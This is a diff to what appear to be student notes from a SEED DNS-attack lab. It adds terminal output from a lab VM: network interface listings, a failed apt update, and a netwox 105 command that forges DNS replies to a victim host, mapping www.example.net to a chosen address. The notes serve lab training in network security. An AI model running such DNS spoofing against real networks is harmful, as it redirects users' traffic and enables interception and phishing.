@@ -119,5 +119,68 @@ ns.example.com.		259200	IN	A	192.168.56.104
 
 [02/16/26]seed@VM:~$ 
 
-Attack
+Attack: [02/16/26]seed@VM:~$ ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:ed:95:58 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.105/24 brd 192.168.56.255 scope global dynamic enp0s3
+       valid_lft 479sec preferred_lft 479sec
+    inet6 fe80::6a80:24e8:5ab:1267/64 scope link 
+       valid_lft forever preferred_lft forever
+3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:ad:05:ef brd ff:ff:ff:ff:ff:ff
+    inet6 fd17:625c:f037:3:c0a8:a310:59c4:a84b/64 scope global temporary dynamic 
+       valid_lft 86280sec preferred_lft 14280sec
+    inet6 fd17:625c:f037:3:3c8:ac24:baaf:77d9/64 scope global mngtmpaddr noprefixroute dynamic 
+       valid_lft 86280sec preferred_lft 14280sec
+    inet6 fe80::ea37:cb08:33eb:2286/64 scope link 
+       valid_lft forever preferred_lft forever
+[02/16/26]seed@VM:~$ sudo apt update
+Err:1 https://download.sublimetext.com apt/stable/ InRelease              
+  Could not resolve host: download.sublimetext.com
+Err:2 http://ppa.launchpad.net/mozillateam/firefox-next/ubuntu xenial InRelease
+  Temporary failure resolving 'ppa.launchpad.net'
+Err:3 http://us.archive.ubuntu.com/ubuntu xenial InRelease                
+  Temporary failure resolving 'us.archive.ubuntu.com'
+Err:4 http://ppa.launchpad.net/webupd8team/java/ubuntu xenial InRelease
+  Temporary failure resolving 'ppa.launchpad.net'
+Reading package lists... Done       
+Building dependency tree       
+Reading state information... Done
+1 package can be upgraded. Run 'apt list --upgradable' to see it.
+W: Failed to fetch http://us.archive.ubuntu.com/ubuntu/dists/xenial/InRelease  Temporary failure resolving 'us.archive.ubuntu.com'
+W: Failed to fetch http://ppa.launchpad.net/mozillateam/firefox-next/ubuntu/dists/xenial/InRelease  Temporary failure resolving 'ppa.launchpad.net'
+W: Failed to fetch https://download.sublimetext.com/apt/stable/InRelease  Could not resolve host: download.sublimetext.com
+W: Failed to fetch http://ppa.launchpad.net/webupd8team/java/ubuntu/dists/xenial/InRelease  Temporary failure resolving 'ppa.launchpad.net'
+W: Some index files failed to download. They have been ignored, or old ones used instead.
+[02/16/26]seed@VM:~$ sudo apt install -y netwox
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+netwox is already the newest version (5.39.0-1.2).
+0 upgraded, 0 newly installed, 0 to remove and 1 not upgraded.
+[02/16/26]seed@VM:~$ netwox 105 -h
+Option '-h|--hostname' must be followed by a value
+Error 10011 : tool argument not decoded
+[02/16/26]seed@VM:~$ ip -br a
+lo               UNKNOWN        127.0.0.1/8 ::1/128 
+enp0s3           UP             192.168.56.105/24 fe80::6a80:24e8:5ab:1267/64 
+enp0s8           UP             fd17:625c:f037:3:c0a8:a310:59c4:a84b/64 fd17:625c:f037:3:3c8:ac24:baaf:77d9/64 fe80::ea37:cb08:33eb:2286/64 
+[02/16/26]seed@VM:~$ sudo netwox 105 \
+>   -h "www.example.net" \
+>   -H 1.2.3.4 \
+>   -a "ns.example.net" \
+>   -A 192.168.56.104 \
+>   -d enp0s3 \
+>   -T 600 \
+>   -f "udp and src host 192.168.56.101 and dst port 53" \
+>   -s raw
+
+
+
 
